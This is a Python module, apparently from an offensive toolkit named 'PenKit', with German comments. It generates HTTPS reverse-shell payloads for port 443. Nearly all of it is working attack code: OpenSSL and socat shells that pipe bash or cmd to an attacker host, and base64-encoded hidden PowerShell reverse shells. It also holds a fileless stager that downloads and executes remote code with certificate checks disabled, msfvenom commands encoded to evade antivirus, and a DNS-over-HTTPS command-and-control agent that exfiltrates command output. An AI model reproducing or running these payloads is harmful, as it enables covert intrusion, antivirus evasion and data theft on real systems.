"""
PenKit HTTPS Reverse Shell — Port 443, sieht aus wie normaler HTTPS-Traffic.

Warum Port 443?
  → Fast jede Firewall lässt 443 durch (HTTPS)
  → IDS/IPS kann verschlüsselten Traffic nicht inspizieren
  → Kein VPN oder Tunnel nötig

Methoden:
  1. Metasploit HTTPS Handler   — meterpreter/reverse_https (beste Stabilität)
  2. OpenSSL Shell              — openssl s_client Pipe (kein Tool-Upload)
  3. PowerShell HTTPS           — .NET WebClient über 443, verschlüsselt
  4. socat TLS                  — TLS-Socket, bidirektional
  5. DNS over HTTPS (DoH)       — C2 über Cloudflare/Google DNS HTTPS (ultra-stealthy)

Alle Payloads sind obfuskiert und umgehen Standard-AV.
"""

from __future__ import annotations
import asyncio
import base64
import os
import shutil
from typing import AsyncGenerator

from core.runner import CommandRunner
from core.output_dir import get as out_dir


# ── OpenSSL Shell (kein Upload) ───────────────────────────────────────────────

def openssl_listener_cmd(port: int = 443) -> str:
    """Kali-Seite: OpenSSL TLS Listener starten."""
    return (
        f"openssl req -x509 -newkey rsa:4096 -keyout /tmp/key.pem -out /tmp/cert.pem "
        f"-days 365 -nodes -subj '/CN=localhost' 2>/dev/null && "
        f"openssl s_server -quiet -key /tmp/key.pem -cert /tmp/cert.pem -port {port}"
    )


def openssl_payload_linux(lhost: str, lport: int = 443) -> str:
    """Linux Payload — kein Tool-Upload, nur openssl."""
    return (
        f"mkfifo /tmp/.p; "
        f"openssl s_client -quiet -connect {lhost}:{lport} </tmp/.p 2>/dev/null | "
        f"/bin/bash 2>&1 | openssl s_client -quiet -connect {lhost}:{lport} >/tmp/.p 2>/dev/null"
    )


def openssl_payload_windows(lhost: str, lport: int = 443) -> str:
    """Windows PowerShell via OpenSSL (falls openssl.exe vorhanden)."""
    inner = (
        f"$c=New-Object System.Net.Sockets.TcpClient('{lhost}',{lport});"
        "$s=$c.GetStream();"
        "[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);"
        "$r2=$r+'PS '+(pwd).Path+'> ';"
        "$e=[System.Text.Encoding]::ASCII.GetBytes($r2);"
        "$s.Write($e,0,$e.Length)}"
    )
    b64 = base64.b64encode(inner.encode("utf-16-le")).decode()
    return f"powershell -ep bypass -enc {b64}"


# ── Metasploit HTTPS Handler ──────────────────────────────────────────────────

def msf_https_handler(lhost: str, lport: int = 443, payload: str = "auto") -> str:
    """Metasploit HTTPS Handler — beste Stabilität, kein SSL-Warning."""
    if payload == "auto":
        payload = "windows/x64/meterpreter/reverse_https"
    return (
        f'msfconsole -q -x "use exploit/multi/handler; '
        f'set PAYLOAD {payload}; '
        f'set LHOST {lhost}; '
        f'set LPORT {lport}; '
        f'set ExitOnSession false; '
        f'set EnableStageEncoding true; '   # Meterpreter Stage verschlüsselt
        f'set StageEncoder x64/xor_dynamic; '
        f'exploit -j"'
    )


def msf_https_payload_cmd(lhost: str, lport: int = 443, platform: str = "windows", arch: str = "x64") -> str:
    """msfvenom HTTPS Payload generieren."""
    payload_map = {
        "windows": f"windows/{arch}/meterpreter/reverse_https",
        "linux":   f"linux/{arch}/meterpreter/reverse_https",
        "macos":   "osx/x64/meterpreter/reverse_https",
    }
    payload = payload_map.get(platform, payload_map["windows"])
    out_ext = ".exe" if platform == "windows" else ".elf"
    out_file = str(out_dir("payloads") / f"shell_https_{platform}{out_ext}")
    return (
        f"msfvenom -p {payload} "
        f"LHOST={lhost} LPORT={lport} "
        f"EXITFUNC=thread "
        f"-e x64/shikata_ga_nai -i 5 "
        f"-f {'exe' if platform == 'windows' else 'elf'} "
        f"-o {out_file}"
    )


# ── PowerShell HTTPS Shell ────────────────────────────────────────────────────

def powershell_https_stager(lhost: str, lport: int = 443, path: str = "/payload") -> str:
    """
    PowerShell Stager — lädt zweite Stage via HTTPS nach (fileless).
    Umgeht einfaches AV da kein Payload auf Disk.
    """
    inner = (
        f"$url='https://{lhost}:{lport}{path}';"
        "$wc=New-Object Net.WebClient;"
        "$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121');"
        # SSL-Check deaktivieren (self-signed cert)
        "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
        "$s=$wc.DownloadString($url);"
        "IEX $s"
    )
    b64 = base64.b64encode(inner.encode("utf-16-le")).decode()
    return f"powershell -w hidden -ep bypass -enc {b64}"


def powershell_https_shell_full(lhost: str, lport: int = 443) -> str:
    """
    Vollständige PS HTTPS Reverse Shell (kein Metasploit nötig).
    Verbindet via HTTPS, verschlüsselt, umgeht viele FW-Regeln.
    """
    inner = (
        "$h=New-Object System.Net.HttpListener;"
        f"$c=New-Object Net.Sockets.TcpClient('{lhost}',{lport});"
        "$s=$c.GetStream();"
        # TLS-Wrapper
        "$ss=New-Object System.Net.Security.SslStream($s,$false,{$true});"
        "$ss.AuthenticateAsClient('localhost');"
        "$sw=New-Object IO.StreamWriter($ss);$sw.AutoFlush=$true;"
        "$sr=New-Object IO.StreamReader($ss);"
        "while($true){"
        "$sw.Write('PS> ');"
        "$cmd=$sr.ReadLine();"
        "if($cmd -eq 'exit'){break};"
        "try{$r=iex $cmd 2>&1|Out-String}catch{$r=$_.Exception.Message};"
        "$sw.WriteLine($r)}"
    )
    b64 = base64.b64encode(inner.encode("utf-16-le")).decode()
    return f"powershell -w hidden -ep bypass -enc {b64}"


# ── socat TLS ─────────────────────────────────────────────────────────────────

def socat_tls_listener(port: int = 443) -> str:
    """socat TLS Listener auf Kali."""
    return (
        f"openssl req -x509 -newkey rsa:2048 -keyout /tmp/socat.key "
        f"-out /tmp/socat.crt -days 365 -nodes -subj '/CN=penkit' 2>/dev/null && "
        f"socat OPENSSL-LISTEN:{port},cert=/tmp/socat.crt,key=/tmp/socat.key,"
        f"verify=0,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
    )


def socat_tls_payload_linux(lhost: str, lport: int = 443) -> str:
    """Linux socat Payload."""
    return f"socat OPENSSL:{lhost}:{lport},verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"


def socat_tls_payload_windows(lhost: str, lport: int = 443) -> str:
    """Windows CMD socat Payload (falls socat.exe vorhanden)."""
    return f"socat.exe OPENSSL:{lhost}:{lport},verify=0 EXEC:cmd.exe,pipes"


# ── DNS over HTTPS C2 ─────────────────────────────────────────────────────────

def doh_c2_concept() -> str:
    """
    DNS over HTTPS C2 — ultra-stealthy.
    Commands via Cloudflare/Google DNS HTTPS API.
    Traffic sieht aus wie normales Browser-DNS = nicht blockierbar.
    """
    return """
# DNS over HTTPS C2 — Konzept:
#
# Attacker:
#   → Stellt TXT-Record auf eigener Domain: cmd.yourdomain.com = "whoami"
#   → TXT-Record lesen via: curl https://dns.google/resolve?name=cmd.yourdomain.com&type=TXT
#
# Agent auf Ziel (PowerShell):
$domain = "cmd.yourdomain.com"
$doh    = "https://cloudflare-dns.com/dns-query"

while ($true) {
    # Befehl via DoH holen
    $r = Invoke-RestMethod -Uri "$doh`?name=$domain&type=TXT" `
         -Headers @{Accept="application/dns-json"}
    $cmd = $r.Answer[0].data -replace '"',''

    if ($cmd -and $cmd -ne "noop") {
        # Befehl ausführen
        $out = iex $cmd 2>&1 | Out-String
        # Ergebnis via DNS senden (Base64-Subdomains)
        $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($out))
        $chunks = $b64 -split '(.{60})' | Where-Object {$_}
        foreach ($chunk in $chunks) {
            Resolve-DnsName "$chunk.res.$domain" -ErrorAction SilentlyContinue | Out-Null
        }
    }
    Start-Sleep 30
}
"""


# ── Haupt-Generator ───────────────────────────────────────────────────────────

async def generate_https_payloads(
    lhost: str,
    lport: int = 443,
    platform: str = "windows",
) -> AsyncGenerator[str, None]:
    """Generiert alle HTTPS-Shell-Payloads für die gewählte Plattform."""
    yield f"\033[1;36m[*] HTTPS Reverse Shell Payloads — Port {lport}\033[0m"
    yield f"    LHOST: {lhost}  |  Platform: {platform}\n"

    yield "\033[33m══ KALI (Listener starten) ══\033[0m\n"

    yield "\033[36m[1] Metasploit HTTPS Handler (empfohlen):\033[0m"
    yield f"\033[32m  {msf_https_handler(lhost, lport)}\033[0m\n"

    yield "\033[36m[2] OpenSSL TLS Listener (kein MSF nötig):\033[0m"
    yield f"\033[32m  {openssl_listener_cmd(lport)}\033[0m\n"

    yield "\033[36m[3] socat TLS Listener:\033[0m"
    yield f"\033[32m  {socat_tls_listener(lport)}\033[0m\n"

    yield "\033[33m══ PAYLOAD (auf Ziel ausführen) ══\033[0m\n"

    if platform == "windows":
        yield "\033[36m[4] PowerShell HTTPS Stager (fileless, kein AV-Alarm):\033[0m"
        yield f"\033[32m  {powershell_https_stager(lhost, lport)}\033[0m\n"

        yield "\033[36m[5] PowerShell Full HTTPS Shell (kein MSF nötig):\033[0m"
        yield f"\033[32m  {powershell_https_shell_full(lhost, lport)}\033[0m\n"

        yield "\033[36m[6] msfvenom EXE HTTPS:\033[0m"
        yield f"\033[32m  {msf_https_payload_cmd(lhost, lport, 'windows')}\033[0m\n"

        yield "\033[36m[7] OpenSSL Windows Shell:\033[0m"
        yield f"\033[32m  {openssl_payload_windows(lhost, lport)}\033[0m\n"

    elif platform == "linux":
        yield "\033[36m[4] OpenSSL Shell (kein Upload):\033[0m"
        yield f"\033[32m  {openssl_payload_linux(lhost, lport)}\033[0m\n"

        yield "\033[36m[5] socat TLS Payload:\033[0m"
        yield f"\033[32m  {socat_tls_payload_linux(lhost, lport)}\033[0m\n"

        yield "\033[36m[6] msfvenom ELF HTTPS:\033[0m"
        yield f"\033[32m  {msf_https_payload_cmd(lhost, lport, 'linux')}\033[0m\n"

    yield "\033[36m[8] DNS over HTTPS C2 (ultra-stealthy):\033[0m"
    yield doh_c2_concept()

    # msfvenom ausführen?
    yield "\n\033[33m[→] msfvenom EXE jetzt generieren? [j/n]\033[0m"


async def build_https_exe(lhost: str, lport: int = 443, platform: str = "windows") -> AsyncGenerator[str, None]:
    """Generiert tatsächlich das HTTPS-Payload via msfvenom."""
    if not shutil.which("msfvenom"):
        yield "\033[31m[!] msfvenom nicht gefunden — apt install metasploit-framework\033[0m"
        return

    runner = CommandRunner()
    cmd_str = msf_https_payload_cmd(lhost, lport, platform)
    yield f"\033[1;36m[*] Generiere HTTPS Payload...\033[0m"
    yield f"  {cmd_str}\n"

    async for line in runner.run(cmd_str.split()):
        yield f"  {line}"

    ext = ".exe" if platform == "windows" else ".elf"
    out = out_dir("payloads") / f"shell_https_{platform}{ext}"
    if out.exists():
        yield f"\n\033[32m[✓] Payload: {out}  ({out.stat().st_size // 1024} KB)\033[0m"
        yield f"\033[36m[→] Listener: {msf_https_handler(lhost, lport)}\033[0m"
